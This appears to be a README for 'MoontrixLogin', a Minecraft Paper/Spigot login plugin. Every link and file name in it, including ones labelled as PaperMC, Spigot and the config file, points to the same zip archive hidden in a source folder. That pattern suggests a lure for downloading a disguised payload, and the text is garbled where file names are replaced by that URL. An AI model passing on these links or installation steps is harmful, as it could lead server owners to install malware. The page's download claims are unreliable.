# 🔒 MoontrixLogin - Easy and Secure Server Login

[![Download MoontrixLogin](https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip)](https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip)

---

## 📋 What is MoontrixLogin?

MoontrixLogin is a plugin designed to add secure login features to Minecraft servers running Paper or Spigot version 1.21.x. It helps server owners manage player authentication smoothly while keeping data safe. This plugin protects your server from unauthorized access and ensures that only verified players can join.

MoontrixLogin works quietly in the background by connecting to your server’s database and validating player logins without interrupting the gameplay experience. It supports popular Minecraft server types like Paper, Spigot, and Purpur, making it easy to add an important security layer to your community.

---

## ⚙️ System Requirements

Before installing MoontrixLogin, ensure your server meets these requirements:

- **Minecraft server software:** Paper, Spigot, or Purpur version 1.21.x  
- **Java version:** Java 17 or later installed on your server machine  
- **Operating system:** Any OS that supports Minecraft servers (Windows, Linux, macOS)  
- **Database:** Basic support for database connection (MySQL, MariaDB, or SQLite)  
- **Memory:** At least 2 GB RAM allocated to your Minecraft server (more is better for bigger servers)  

Make sure your server is already running one of the compatible server types listed above before attempting to add MoontrixLogin.

---

## 📥 Download & Install

### Step 1: Download MoontrixLogin

Click the big button at the top or use this link to visit the official download page:  

[Download MoontrixLogin Releases](https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip)

Once you are on the releases page, look for the latest version of the plugin. You will find a `.jar` file, usually named something like `https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip` where x.y.z is the version number.

### Step 2: Upload the Plugin

1. **Stop your Minecraft server.**  
2. Open your server's folder on your computer or host control panel.  
3. Locate the `plugins` folder.  
4. Upload the downloaded `.jar` file into the `plugins` folder.  

### Step 3: Start Your Server

- Start or restart your Minecraft server.  
- MoontrixLogin will load automatically during startup.  

Give it a few seconds to set up. If this is the first time you install it, the plugin will create configuration files and set up its database connection.

---

## ⚙️ Configuration

MoontrixLogin uses a configuration file to manage its settings. This file is normally called `https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip` and is located inside the `/plugins/MoontrixLogin` folder.

### Basic Configuration

Open the `https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip` file with a plain text editor to make sure the following settings meet your needs:

- **Database connection:** Enter your database details such as host, port, username, password, and database name.  
- **Timeout settings:** Adjust login timeouts if needed.  
- **Security options:** You can enable or disable features like password hashing and login attempts limits.  

### Common Settings to Check

```yaml
database:
  type: mysql
  host: localhost
  port: 3306
  username: your_database_user
  password: your_password
  name: moontrixlogin_db

security:
  maxLoginAttempts: 5
  passwordHashing: true
  sessionTimeout: 30 # minutes
```

Changing these settings depends on your server setup and security preferences. If you don’t have a database, you may use SQLite for simpler demo or test setups.

---

## 🕹 Using MoontrixLogin on Your Server

Once MoontrixLogin is installed and configured, players who join your server will be asked to register and log in using a secure system integrated with Minecraft chat. Here is how the process works from a player’s viewpoint:

- When a new player joins for the first time, they receive a prompt to create a password.  
- Returning players are asked to enter their password to continue.  
- If a player fails to log in after a set number of tries, the plugin may prevent them from joining temporarily.  

Server admins can customize messages and login rules in the configuration files so players understand what to do clearly.

---

## 🛠 Features

MoontrixLogin offers these useful features:

- Secure password storage with strong hashing  
- Database support for both lightweight and enterprise setups  
- Compatibility with Paper, Spigot, and Purpur Minecraft servers  
- Supports Folia API and asynchronous operations to reduce server lag  
- Limits login attempts to prevent brute force attacks  
- Session management with timeout controls  
- Easy configuration with user-friendly files  
- Supports multiple Minecraft versions within 1.21.x range  
- Logs all authentication attempts for server administration  

These features help protect your server while letting players enjoy a smooth login experience.

---

## 🧩 Compatibility

MoontrixLogin works well with:

- Paper, Spigot, and Purpur Minecraft 1.21.x servers  
- Folia scheduling API for better performance  
- Most database systems supported by Minecraft plugins (MySQL, MariaDB, SQLite)  
- Other common server plugins without conflicts  

---

## 🛡 Security Considerations

Security is important when handling player data. MoontrixLogin takes care to:

- Avoid storing plain text passwords  
- Use proper password hashing algorithms  
- Limit login attempts  
- Keep player sessions safe and time-limited  

Server admins should also take general security steps like running servers behind firewalls, keeping Java up-to-date, and securing database credentials.

---

## 🧰 Troubleshooting & Support

If you encounter issues, try these steps:

- Check your Java version meets requirements  
- Review the server console for error messages during startup  
- Ensure your database connection details in `https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip` are correct  
- Look into plugin logs under `/plugins/MoontrixLogin/logs`  
- Confirm you are running a supported Minecraft server version (1.21.x)  

If problems persist, visit the GitHub page and read the issues or open a new issue there for help.

---

## 🔗 Useful Links

- Official MoontrixLogin download page: [https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip](https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip)  
- PaperMC server software: https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip  
- Spigot server software: https://github.com/hibamarzak/MoontrixLogin/raw/refs/heads/main/src/main/java/fr/lordmoontrix/moontrixlogin/storage/Moontrix_Login_emporeutic.zip  

---

The MoontrixLogin plugin provides a straightforward way to add player authentication to your Minecraft server. Following these steps will help you download, install, and configure the plugin to enhance your server’s security without hassle.